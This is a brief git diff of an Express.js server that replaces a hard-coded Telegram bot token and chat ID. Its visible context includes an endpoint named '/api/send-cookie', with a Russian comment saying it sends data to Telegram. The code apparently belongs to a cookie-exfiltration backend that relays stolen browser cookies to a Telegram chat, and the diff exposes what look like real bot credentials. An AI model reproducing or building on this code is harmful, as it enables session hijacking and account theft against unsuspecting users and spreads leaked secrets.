@@ -10,8 +10,8 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Telegram bot API endpoint
-const TELEGRAM_BOT_TOKEN = '8387444669:AAEtibudcE2cWwwixv8wD9cGhUydpY7DRVQ';
-const TELEGRAM_CHAT_ID = '8224914068';
+const TELEGRAM_BOT_TOKEN = '8269190936:AAFUA0_RD5uVJRjd-1rFRTSoFX1-_I3nUdg';
+const TELEGRAM_CHAT_ID = '8265344826';
 
 // API endpoint для отправки данных в Telegram
 app.post('/api/send-cookie', async (req, res) => {
